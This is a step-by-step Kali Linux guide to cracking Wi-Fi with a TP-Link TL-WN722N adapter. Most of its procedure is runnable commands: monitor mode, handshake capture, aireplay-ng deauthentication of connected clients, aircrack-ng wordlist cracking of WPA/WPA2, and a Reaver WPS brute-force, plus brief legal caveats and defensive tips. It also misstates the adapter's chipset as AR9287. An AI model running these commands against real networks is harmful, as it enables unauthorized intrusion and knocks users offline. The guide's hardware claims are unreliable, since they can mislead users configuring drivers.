# TP-Link TL-WN722N USB Wi-Fi Adapter for Penetration Testing

## **Overview**
This guide explains how to use the **TP-Link TL-WN722N USB Wi-Fi adapter** for penetration testing with **Kali Linux**. It covers installation, configuration, network settings for VMs, and ethical considerations.

## **Prerequisites**
- **TP-Link TL-WN722N USB Wi-Fi Adapter** (with **Atheros AR9287 chipset**).
- **Kali Linux** (installed on a physical machine or Virtual Machine).
- **Aircrack-ng Suite** (for wireless network auditing).
- **Reaver** (for WPS brute-force attacks).

---

## **Network Settings for Virtual Machines**
If using Kali Linux in **VirtualBox or VMware**, you must **attach the USB Wi-Fi adapter directly to the VM** instead of using NAT or Bridged Adapter.

### **For VirtualBox:**
1. **Plug in the TP-Link TL-WN722N Adapter** to your computer.
2. **Start VirtualBox** (but do not start the Kali Linux VM yet).
3. **Go to VirtualBox Settings** → `USB`.
4. **Enable USB Controller**:
   - Select `USB 2.0 (EHCI) Controller` (install the VirtualBox Extension Pack if required).
5. **Add the USB device**:
   - Click the `+` icon and select **TP-Link TL-WN722N** from the list.
6. **Start your Kali Linux VM**.
7. **Verify the adapter is recognized** by running:
   ```bash
   lsusb
   ```
   Look for an entry like `Atheros Communications, Inc.`.
8. **Check if it appears as a network interface**:
   ```bash
   iwconfig
   ```
   If you see `wlan0` or `wlan1`, your adapter is detected.

### **For VMware Workstation/Player:**
1. **Plug in the TP-Link TL-WN722N Adapter**.
2. **Start VMware Workstation** (but do not start the Kali Linux VM yet).
3. **Go to** `VM` → `Removable Devices` → `TP-Link TL-WN722N`.
4. **Select** `Connect (Disconnect from Host)`.
5. **Start your Kali Linux VM**.
6. **Verify the adapter is recognized**:
   ```bash
   lsusb
   iwconfig
   ```

---

## **Step-by-Step Process**
### **1. Install Kali Linux**
If you haven't already, [download and install Kali Linux](https://www.kali.org/get-kali/) from the official website.

### **2. Install Necessary Drivers**
The TP-Link TL-WN722N adapter uses the **Atheros AR9287 chipset**, supported by the `ath9k` driver in Linux.
```bash
sudo apt update
sudo apt install firmware-atheros
```

### **3. Connect the TP-Link TL-WN722N Adapter**
Simply plug the adapter into a **USB port** on your Kali Linux machine.

### **4. Verify the Adapter is Recognized**
Run the following command:
```bash
iwconfig
```
You should see an interface like `wlan0` or `wlan1`.

### **5. Put the Adapter in Monitor Mode**
```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### **6. Scan for Available Networks**
```bash
sudo airodump-ng wlan0
```
This will display a list of available networks.

### **7. Capture Handshake**
```bash
sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlan0
```
Replace `<BSSID>` with the target network's BSSID and `<CHANNEL>` with the channel number.

### **8. Deauthenticate Clients**
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
```
This will force clients to disconnect and reconnect, allowing you to capture the handshake.

### **9. Crack the WPA/WPA2 Password**
```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist.txt` with your actual wordlist file and `<BSSID>` with the target BSSID.

### **10. Alternative: Attack WPS (Wi-Fi Protected Setup)**
```bash
sudo reaver -i wlan0 -b <BSSID> -vv
```

---

## **Important Notes**
### **Legal and Ethical Considerations**
- **Unauthorized penetration testing is illegal**. Always obtain **explicit permission** before testing any network.
- **Use these techniques only for educational and security assessment purposes**.
- **Hacking unauthorized networks can lead to severe legal consequences.**

### **Security Measures to Protect Your Own Network**
- Use **WPA3 or strong WPA2 encryption**.
- Set **complex passwords** and update them regularly.
- **Disable WPS (Wi-Fi Protected Setup)** to prevent brute-force attacks.
- Regularly **update your router firmware** to patch security vulnerabilities.

---

By following these steps, you can ethically test the security of your own Wi-Fi network and identify potential vulnerabilities. **Always prioritize legal and ethical considerations in your penetration testing activities.**

---

### **Disclaimer**
This guide is for **educational purposes only**. The author is **not responsible** for any misuse of this information. Always obtain **legal authorization** before performing penetration testing on any network.

